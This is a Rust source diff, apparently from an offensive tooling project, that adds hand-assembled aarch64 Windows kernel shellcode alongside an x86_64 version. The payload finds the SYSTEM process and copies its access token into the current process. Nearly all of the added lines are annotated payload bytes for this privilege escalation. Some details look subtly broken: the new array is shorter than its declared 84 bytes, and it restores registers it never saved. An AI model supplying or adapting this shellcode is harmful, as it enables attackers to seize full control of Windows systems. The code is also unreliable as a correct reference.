@@ -4,6 +4,7 @@ use goblin::pe::section_table::IMAGE_SCN_CNT_CODE;
 #[cfg(all(target_os = "windows", not(feature = "shellcode_fallback")))]
 use goblin::Object;
 
+#[cfg(all(target_arch = "x86_64", feature = "shellcode_fallback"))]
 pub fn token_stealing_shellcode_fallback() -> [u8; 84] {
     return concat_bytes!(
         b"\x50",                             // 00000000: push rax
@@ -27,6 +28,32 @@ pub fn token_stealing_shellcode_fallback() -> [u8; 84] {
         b"\x48\x83\xc4\x28",                 // 00000047: add rsp,byte +0x28
         b"\x4c\x8b\xbc\x24\x88\x00\x00\x00", // 0000004B: mov r15, [rsp+0x88]
         b"\xc3"                              // 00000053: ret
+    )
+    .clone();
+}
+
+#[cfg(all(target_arch = "aarch64", feature = "shellcode_fallback"))]
+pub fn token_stealing_shellcode_fallback() -> [u8; 84] {
+    return concat_bytes!(
+        b"\xe0\x07\x3e\xa9",                 // 0000000000000000: stp x0,x1,[sp,#-0x20]
+        b"\xe2\x0f\x3f\xa9",                 // 0000000000000004: stp x2,x3,[sp,#-0x10]
+        b"\x40\xc6\x44\xf9",                 // 0000000000000008: ldr x0,[xpr,#0x988]
+        b"\x00\x58\x40\xf9",                 // 000000000000000C: ldr x0,[x0,#0xB0]
+        b"\xe1\x03\x00\xaa",                 // 0000000000000010: mov x1,x0
+        b"\x82\x00\x80\xd2",                 // 0000000000000014: mov x2,#4
+        b"\x00\x20\x07\x91",                 // 0000000000000018: add x0,x0,#0x1C8
+        b"\x00\x00\x40\xf9",                 // 000000000000001C: ldr x0,[x0]
+        b"\x00\x20\x07\xd1",                 // 0000000000000020: sub x0,x0,#0x1C8
+        b"\x03\xc0\x41\xb9",                 // 0000000000000024: ldr w3,[x0,#0x1C0]
+        b"\x7f\x00\x02\x6b",                 // 0000000000000028: cmp w3,w2
+        b"\x61\xff\xff\x54",                 // 000000000000002C: bne find_system
+        b"\x02\x1c\x41\xf9",                 // 0000000000000030: ldr x2,[x0,#0x238]
+        b"\x22\x1c\x01\xf9",                 // 0000000000000034: str x2,[x1,#0x238]
+        b"\xe0\x07\x40\xa9",                 // 0000000000000038: ldp x0,x1,[sp]
+        b"\xe2\x0f\x41\xa9",                 // 000000000000003C: ldp x2,x3,[sp,#0x10]
+        b"\xfd\x7b\xc0\xa8",                 // 0000000000000040: ldp fp,lr,[sp],#0
+        b"\xff\xc3\x00\x91",                 // 0000000000000044: add sp,sp,#0x30
+        b"\xc0\x03\x5f\xd6"                  // 0000000000000048: ret
     )
     .clone();
 }
@@ -213,7 +240,12 @@ pub fn token_stealing_shellcode() -> Vec<u8> {
     extract_shellcode_from_obj(shellcode_obj)
 }
 
-#[cfg(all(target_os = "windows", feature = "shellcode_fallback"))]
+#[cfg(all(target_os = "windows", target_arch = "x86_64", feature = "shellcode_fallback"))]
+pub fn token_stealing_shellcode() -> Vec<u8> {
+    token_stealing_shellcode_fallback().to_vec()
+}
+
+#[cfg(all(target_os = "windows", target_arch = "aarch64", feature = "shellcode_fallback"))]
 pub fn token_stealing_shellcode() -> Vec<u8> {
     token_stealing_shellcode_fallback().to_vec()
 }
